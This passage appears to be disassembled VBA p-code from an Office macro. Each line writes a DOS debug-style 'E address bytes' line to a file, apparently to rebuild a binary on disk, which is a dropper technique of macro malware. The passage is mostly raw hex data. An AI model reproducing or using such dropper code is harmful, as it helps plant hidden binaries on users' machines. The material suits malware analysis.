' 	LitStr 0x0036 "E D170 9F AF 9F AD C0 8F 9D B3 89 96 B0 90 9F B9 88 96"
' 	PrintItemNL 
' Line #3546:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D180 B2 82 91 AB 8B 9A B4 85 95 AC 78 87 9A 84 92 A4"
' 	PrintItemNL 
' Line #3547:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D190 95 A1 B3 97 A4 B4 A1 AA B8 A7 B0 BD A7 AF BC B4"
' 	PrintItemNL 
' Line #3548:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D1A0 BD C7 9A A3 AD 7B 84 8E 7F 89 93 86 92 9C 7A 86"
' 	PrintItemNL 
' Line #3549:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D1B0 92 71 7F 8B 6D 7D 89 6F 7E 87 7D 89 8F 8B 94 98"
' 	PrintItemNL 
' Line #3550:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D1C0 96 9A 9F 8A 8D 92 95 98 9D 00 00 05 00 00 F2 F7"
' 	PrintItemNL 
' Line #3551:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D1D0 F5 F0 F5 F3 D0 D5 D4 CC D1 D0 C5 C7 C7 B7 B9 B9"
' 	PrintItemNL 
' Line #3552:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D1E0 00 02 03 F3 F7 F8 F6 FA FB EA EF F0 E7 EC EF D8"
' 	PrintItemNL 
' Line #3553:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D1F0 DF E2 8F 96 99 BD C6 C9 D5 DE E1 EC F7 FB 7A 88"
' 	PrintItemNL 
' Line #3554:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D200 8E 89 99 9F E6 F2 F8 EF F9 FF EC F4 FB F6 FE FF"
' 	PrintItemNL 
' Line #3555:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D210 F8 FE FF E7 ED F4 DF E7 EE F4 FE FF C9 D5 DB AB"
' 	PrintItemNL 
' Line #3556:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D220 B7 BD F3 FF FF F2 FE FF D6 E2 E8 5C 67 6B 7F 87"
' 	PrintItemNL 
' Line #3557:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D230 87 EF F7 F6 F6 FE FD F4 FF FD DF E9 E9 A7 B3 B5"
' 	PrintItemNL 
' Line #3558:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D240 F4 FF FF EF FB FF E1 EF F5 AA BA C1 BB CB D2 DA"
' 	PrintItemNL 
' Line #3559:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D250 EB F4 DF EF FB DE F0 FB CC DD EA B6 C7 D4 96 A7"
' 	PrintItemNL 
' Line #3560:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D260 B4 8C 9C A9 85 94 A4 8A 9A A7 8E 9D AD 85 94 A4"
' 	PrintItemNL 
' Line #3561:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D270 71 80 90 61 70 80 58 66 78 60 6E 80 6E 7C 8E 75"
' 	PrintItemNL 
' Line #3562:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D280 83 95 6D 7B 8E 60 6E 81 61 6F 82 6C 7A 8D 4D 5A"
' 	PrintItemNL 
' Line #3563:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D290 70 53 60 76 67 74 8A 73 80 96 66 73 89 5D 6A 80"
' 	PrintItemNL 
' Line #3564:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D2A0 6D 7A 90 81 8E A4 99 A7 BA B2 C0 D2 CD DB ED E6"
' 	PrintItemNL 
' Line #3565:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D2B0 F5 FF E8 F8 FF D5 E5 F2 B4 C4 D0 86 96 A2 90 9B"
' 	PrintItemNL 
' Line #3566:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D2C0 A9 99 A2 B0 79 82 8F 74 80 8A 87 93 9D 8F 9B A5"
' 	PrintItemNL 
' Line #3567:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D2D0 97 A3 AD 8C 99 A7 8B 97 A9 78 86 99 77 83 9B 83"
' 	PrintItemNL 
' Line #3568:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D2E0 91 A8 82 8F A9 80 8E A5 87 95 AC 7F 8D A3 7E 8D"
' 	PrintItemNL 
' Line #3569:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D2F0 A0 81 8F A1 99 A5 B7 A0 AD BD A3 AC BA A8 B1 BE"
' 	PrintItemNL 
' Line #3570:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D300 A1 A9 B6 9A A2 AF 94 9D A7 8D 96 A0 92 9C A6 8D"
' 	PrintItemNL 
' Line #3571:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D310 99 A3 81 8D 99 7D 8B 97 7D 8D 9A 81 8F 9B 8B 96"
' 	PrintItemNL 
' Line #3572:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D320 9E 84 8A 91 8B 8E 96 79 7B 83 7F 81 89 00 00 06"
' 	PrintItemNL 
' Line #3573:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D330 00 00 F3 F8 F7 EA EF EE DC E1 E0 D0 D5 D4 B9 BB"
' 	PrintItemNL 
' Line #3574:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D340 BB B2 B4 B4 01 03 04 FC FE FF FB FD FE F6 FA FB"
' 	PrintItemNL 
' Line #3575:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D350 F0 F3 F7 F5 FA FD D6 DD E0 F2 F9 FC F6 FF FF D8"
' 	PrintItemNL 
' Line #3576:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D360 E4 E6 6E 7D 80 98 A7 AA E3 ED F4 F3 FC FF F6 FC"
' 	PrintItemNL 
' Line #3577:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D370 FF F7 FB FF F9 FC FF E5 E9 EE F5 FB FF F6 FF FF"
' 	PrintItemNL 
' Line #3578:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D380 80 8A 91 AC B8 BC F1 FB FF F4 FF FF D0 DA E1 56"
' 	PrintItemNL 
' Line #3579:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D390 5F 63 B8 C0 C0 FA FF FF F8 FF FF F8 FF FF EE F6"
' 	PrintItemNL 
' Line #3580:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D3A0 F6 B8 C2 C2 F6 FF FF F4 FF FF E9 F5 F9 B4 C2 C8"
' 	PrintItemNL 
' Line #3581:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D3B0 BF CD D3 DE EE F5 DD ED F4 EC FB FF E3 F4 FD CB"
' 	PrintItemNL 
' Line #3582:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D3C0 DB E7 D3 E1 ED C9 D7 E3 BE CB D9 B9 C7 D3 B7 C4"
' 	PrintItemNL 
' Line #3583:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D3D0 D2 B5 C2 D0 B1 BE CC AE BB C9 B0 BD CD 9E AB BB"
' 	PrintItemNL 
' Line #3584:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D3E0 8F 9C AC 8A 97 A7 86 92 A4 82 8E A0 85 91 A3 8D"
' 	PrintItemNL 
' Line #3585:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D3F0 99 AB 7A 86 98 6B 77 89 75 81 93 8B 97 A9 8E 99"
' 	PrintItemNL 
' Line #3586:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D400 AD 8E 99 AD 9E A9 BD AC B7 CB D9 E5 F7 E7 F3 FF"
' 	PrintItemNL 
' Line #3587:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D410 E8 F5 FF DE EB F9 C6 D3 E1 B3 C1 CD A9 B7 C3 93"
' 	PrintItemNL 
' Line #3588:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D420 9F AB A0 A9 B6 BE C7 D4 B6 C0 CA AC B7 BF AE B9"
' 	PrintItemNL 
' Line #3589:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D430 C1 A7 B4 BC A6 B3 BB A0 AC B6 91 9C AA 84 90 A2"
' 	PrintItemNL 
' Line #3590:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D440 7C 87 9B 7E 8B A1 7D 8A A0 74 81 97 71 7E 94 71"
' 	PrintItemNL 
' Line #3591:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D450 7F 92 70 7E 91 67 75 87 7D 89 9B 89 93 A4 8F 98"
' 	PrintItemNL 
' Line #3592:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D460 A6 A1 A9 B6 96 9C A9 76 7C 87 8A 90 9B 8E 95 9E"
' 	PrintItemNL 
' Line #3593:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D470 8F 98 A2 83 8D 97 73 7F 89 6F 7D 89 7B 8B 97 8D"
' 	PrintItemNL 
' Line #3594:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D480 9B A7 96 9F A9 75 7A 83 7A 7C 86 85 86 90 7B 7C"
' 	PrintItemNL 
' Line #3595:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D490 86 07 08 12 00 00 EF F4 F5 E5 EA EB DC E0 E1 C4"
' 	PrintItemNL 
' Line #3596:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D4A0 C8 C9 BC BE BF C4 C6 C7 00 00 03 F6 F7 FB FD FE"
' 	PrintItemNL 
' Line #3597:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D4B0 FF F9 FC FF FB FE FF FA FF FF F2 F9 FC E1 E8 EB"
' 	PrintItemNL 
' Line #3598:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D4C0 F2 FB FE B3 BF C1 7E 8B 8D CF DC DE F6 FF FF F8"
' 	PrintItemNL 
' Line #3599:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D4D0 FF FF FB FE FF FA FD FF F7 FA FF EF F2 F6 F2 F8"
' 	PrintItemNL 
' Line #3600:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D4E0 FD E3 EC EF 68 71 75 C6 D2 D4 F6 FF FF F6 FF FF"
' 	PrintItemNL 
' Line #3601:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D4F0 DD E3 E8 7C 83 86 CD D2 D3 FA FF FF F1 F7 F6 F6"
' 	PrintItemNL 
' Line #3602:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D500 FE FD E4 EC EC A9 B3 B3 EE F7 FA F6 FF FF E8 F4"
' 	PrintItemNL 
' Line #3603:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D510 F6 B0 BB BF BD C8 CC F2 FE FF E6 F2 F8 E2 EF F7"
' 	PrintItemNL 
' Line #3604:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D520 EA F7 FF F1 FE FF EB F5 FF EB F5 FF E9 F2 FF E5"
' 	PrintItemNL 
' Line #3605:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D530 EF F9 E1 EA F7 E1 EA F7 E1 EA F7 E2 EB F8 BA C3"
' 	PrintItemNL 
' Line #3606:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D540 D1 B0 B9 C7 AD B6 C4 B2 BB C9 B0 B8 C9 A4 AC BD"
' 	PrintItemNL 
' Line #3607:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D550 99 A1 B2 96 9E AF A1 AA B7 95 9E AB 90 99 A6 93"
' 	PrintItemNL 
' Line #3608:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D560 9C A9 9B A4 B2 AC B5 C3 BF C7 D8 C8 D0 E1 D0 D8"
' 	PrintItemNL 
' Line #3609:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D570 E9 D3 DC EA C4 CD DB B4 BD CA AD B7 C1 BE C9 D1"
' 	PrintItemNL 
' Line #3610:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D580 D4 DF E7 CC D7 DF A9 B1 BE CE D6 E3 C5 CE D8 A6"
' 	PrintItemNL 
' Line #3611:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D590 B1 B9 C4 D0 D6 CF DB E1 AC B8 BE AE B9 C1 9F A8"
' 	PrintItemNL 
' Line #3612:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D5A0 B5 90 9B A9 8C 96 A7 8F 9B AD 90 9B AF 8B 97 A9"
' 	PrintItemNL 
' Line #3613:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D5B0 84 90 A2 84 91 A1 74 81 91 71 7E 8C 86 91 9F 82"
' 	PrintItemNL 
' Line #3614:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D5C0 8B 98 80 86 93 A4 A8 B3 B6 B8 C2 A6 A8 B2 8C 8E"
' 	PrintItemNL 
' Line #3615:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D5D0 98 86 89 91 8C 91 9A 9C A3 AC 8B 96 9E 63 6F 79"
' 	PrintItemNL 
' Line #3616:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D5E0 56 65 6E 69 75 7F 6B 74 7D 59 5E 67 5E 60 6A 7E"
' 	PrintItemNL 
' Line #3617:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D5F0 7F 89 74 75 7F 00 00 09 00 00 F9 FE FF F8 FD FE"
' 	PrintItemNL 
' Line #3618:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D600 FB FF FF FB FF FF FD FF FF F1 F3 F4 01 00 04 F5"
' 	PrintItemNL 
' Line #3619:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D610 F4 F8 FD FE FF F4 F5 F9 FD FE FF FA FD FF FA FF"
' 	PrintItemNL 
' Line #3620:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D620 FF E8 EF F2 F8 FF FF 97 A0 A3 81 8D 8F E5 F1 F1"
' 	PrintItemNL 
' Line #3621:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D630 F8 FF FF E9 EE EF EF F0 F4 FC FE FF FD FE FF FB"
' 	PrintItemNL 
' Line #3622:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D640 FF FF FA FF FF B1 B9 B9 75 7E 81 E4 EE EE F6 FF"
' 	PrintItemNL 
' Line #3623:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D650 FF F8 FF FF F3 F8 FB 75 7A 7B BD C2 C3 FA FF FF"
' 	PrintItemNL 
' Line #3624:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D660 F9 FF FE FA FF FF E9 F1 F1 AF B7 B7 F8 FF FF F6"
' 	PrintItemNL 
' Line #3625:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D670 FF FF F4 FD FF 90 99 9C 80 89 8D E1 EC F0 F4 FF"
' 	PrintItemNL 
' Line #3626:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D680 FF E5 F0 F4 D2 DC E3 EB F5 FC F6 FD FF F2 F8 FF"
' 	PrintItemNL 
' Line #3627:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D690 ED F3 FE EC F2 FD EA F0 FB DD E3 EE C2 C8 D5 AB"
' 	PrintItemNL 
' Line #3628:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D6A0 B1 BE C4 CA D7 C8 CE DB CF D4 E3 D0 D5 E4 C0 C5"
' 	PrintItemNL 
' Line #3629:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D6B0 D4 AC B1 C0 A9 AE BD B1 B7 C4 C4 CB D4 D5 DD E4"
' 	PrintItemNL 
' Line #3630:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D6C0 D5 DC E5 BE C5 CE AE B4 BF B2 B8 C3 B7 BD CA B4"
' 	PrintItemNL 
' Line #3631:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D6D0 BA C7 AA B0 BD C5 CB D8 D0 D6 E3 C8 CE D9 BA C1"
' 	PrintItemNL 
' Line #3632:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D6E0 CA C0 C8 CF D5 DD E4 D1 D9 E0 A5 AE B8 AE B7 C1"
' 	PrintItemNL 
' Line #3633:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D6F0 BF C8 D1 BA C4 CB DE EA EE F3 FF FF CA D6 DA BF"
' 	PrintItemNL 
' Line #3634:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D700 CB CF 9C A7 AF 84 8D 9A 86 8F 9D 90 9A AB 95 9D"
' 	PrintItemNL 
' Line #3635:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D710 AE 96 A0 B1 91 9B AC 88 93 A1 8C 97 A5 AE BA C6"
' 	PrintItemNL 
' Line #3636:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D720 E4 ED FA EA F3 FD DF E3 EE EE F0 FA F2 F4 FC E7"
' 	PrintItemNL 
' Line #3637:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D730 E7 ED D9 D9 DF DC DF E4 E3 E7 EC E6 EC F1 C8 D0"
' 	PrintItemNL 
' Line #3638:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D740 D7 99 A5 AB 8C 99 A1 98 A3 AB 8D 96 9F 84 8A 91"
' 	PrintItemNL 
' Line #3639:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D750 7D 80 88 8C 8E 96 7B 7D 85 00 00 06 00 00 F8 FF"
' 	PrintItemNL 
' Line #3640:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D760 FF F7 FE FF F9 FE FF FB FE FF F8 F9 FD F3 F4 F8"
' 	PrintItemNL 
' Line #3641:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D770 17 16 1A DA D9 DD FB FA FE F7 F8 FC FD FD FF F9"
' 	PrintItemNL 
' Line #3642:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D780 FC FF FA FE FF F6 FC FF ED F3 F8 92 9B 9E C2 CE"
' 	PrintItemNL 
' Line #3643:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D790 CE F4 FF FF F8 FF FF EE F3 F2 F7 F6 F8 FF FF FF"
' 	PrintItemNL 
' Line #3644:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D7A0 FF FE FF FC FE FE F0 F4 F5 9D A5 A4 A5 AF AF F6"
' 	PrintItemNL 
' Line #3645:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D7B0 FF FF F7 FF FF F1 F9 F8 E9 EE EF 73 77 78 C4 C9"
' 	PrintItemNL 
' Line #3646:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D7C0 CA F8 FD FE FA FF FF FA FF FF F5 FA FB CB D0 D1"
' 	PrintItemNL 
' Line #3647:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D7D0 F9 FE FF F5 FD FD F8 FF FF A6 AD B0 82 89 8C D5"
' 	PrintItemNL 
' Line #3648:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D7E0 DE E1 F6 FF FF F2 FB FE CC D5 D9 D2 DB DF F2 F8"
' 	PrintItemNL 
' Line #3649:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D7F0 FF ED F2 FB EA EF F8 EF F4 FD F8 FD FF F3 F8 FF"
' 	PrintItemNL 
' Line #3650:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D800 DA DE E9 C0 C4 CF F5 F9 FF F0 F4 FF EA ED FB DF"
' 	PrintItemNL 
' Line #3651:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D810 E2 F0 CC CF DD C3 C6 D4 D3 D6 E4 EA EE F9 E8 EE"
' 	PrintItemNL 
' Line #3652:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D820 F3 F4 FB FE F2 F8 FD D7 DD E2 BC C2 C9 B7 BC C5"
' 	PrintItemNL 
' Line #3653:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D830 B9 BD C8 B6 BA C5 D5 D9 E4 E3 E8 F1 E7 EC F5 E4"
' 	PrintItemNL 
' Line #3654:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D840 EA F1 DB E1 E8 E0 E6 EB EF F5 FA E8 EE F5 BD C3"
' 	PrintItemNL 
' Line #3655:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D850 CE AF B8 C2 D0 D9 E2 D2 DC E3 D0 DC DE EA F6 F6"
' 	PrintItemNL 
' Line #3656:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D860 F0 FC FE F4 FF FF B0 BA C1 92 9B A4 8E 96 A3 8F"
' 	PrintItemNL 
' Line #3657:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D870 98 A6 8E 95 A4 90 99 A7 8A 93 A1 84 8D 9A 7E 87"
' 	PrintItemNL 
' Line #3658:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D880 94 A2 AB B5 DC E2 ED F3 F8 FF F9 FB FF FD FD FF"
' 	PrintItemNL 
' Line #3659:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D890 FF FD FF F7 F6 FA FA F9 FD FF FE FF F9 FA FE DE"
' 	PrintItemNL 
' Line #3660:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D8A0 E3 E6 BE C4 C9 B3 BC C0 C7 D1 D8 D3 DE E2 B1 BA"
' 	PrintItemNL 
' Line #3661:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D8B0 BE A1 A7 AC 99 9C A1 92 92 98 7E 7E 84 17 17 1D"
' 	PrintItemNL 
' Line #3662:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D8C0 00 00 F8 FF FF F8 FF FF F9 FE FF FA FF FF F9 FA"
' 	PrintItemNL 
' Line #3663:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D8D0 FE FD FE FF 00 00 03 06 05 09 00 00 03 00 00 03"
' 	PrintItemNL 
' Line #3664:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D8E0 00 00 04 00 00 04 00 02 07 00 01 06 00 00 04 00"
' 	PrintItemNL 
' Line #3665:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D8F0 01 04 00 01 01 00 07 05 00 01 00 01 06 05 03 03"
' 	PrintItemNL 
' Line #3666:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D900 03 02 00 00 00 00 00 00 01 01 00 04 03 00 01 00"
' 	PrintItemNL 
' Line #3667:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D910 00 01 00 00 04 02 00 06 05 00 01 00 00 01 00 00"
' 	PrintItemNL 
' Line #3668:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D920 01 00 00 00 01 00 00 01 00 01 02 00 00 01 05 0A"
' 	PrintItemNL 
' Line #3669:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D930 0B 00 00 01 00 00 01 00 01 02 00 00 03 00 02 05"
' 	PrintItemNL 
' Line #3670:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D940 00 00 03 00 06 09 00 00 03 00 07 0A 00 00 03 00"
' 	PrintItemNL 
' Line #3671:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D950 02 05 00 00 06 00 01 09 00 00 0A 00 00 07 00 00"
' 	PrintItemNL 
' Line #3672:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D960 07 00 00 08 00 00 09 00 00 08 00 00 09 00 00 08"
' 	PrintItemNL 
' Line #3673:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D970 00 00 0A 00 00 0D 00 00 0C 00 00 0A 00 00 0A 02"
' 	PrintItemNL 
' Line #3674:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D980 04 0E 00 02 05 00 01 00 00 00 03 00 04 07 00 00"
' 	PrintItemNL 
' Line #3675:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D990 06 00 00 06 00 01 0B 00 00 0A 00 00 07 00 00 07"
' 	PrintItemNL 
' Line #3676:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D9A0 00 00 06 00 02 0A 00 00 04 00 00 04 01 06 09 00"
' 	PrintItemNL 
' Line #3677:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D9B0 00 04 00 00 0A 00 00 08 00 01 0A 00 00 04 00 01"
' 	PrintItemNL 
' Line #3678:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D9C0 03 00 04 04 00 01 01 00 01 03 00 05 09 00 00 07"
' 	PrintItemNL 
' Line #3679:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D9D0 00 00 08 00 00 0A 00 00 0F 00 00 0E 00 00 0A 00"
' 	PrintItemNL 
' Line #3680:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D9E0 00 0A 00 00 08 00 00 08 00 00 09 00 00 06 00 00"
' 	PrintItemNL 
' Line #3681:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D9F0 06 04 04 0A 03 00 04 05 01 06 02 00 01 00 00 01"
' 	PrintItemNL 
' Line #3682:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E DA00 00 00 01 01 05 06 00 00 03 00 00 03 00 03 07 00"
' 	PrintItemNL 
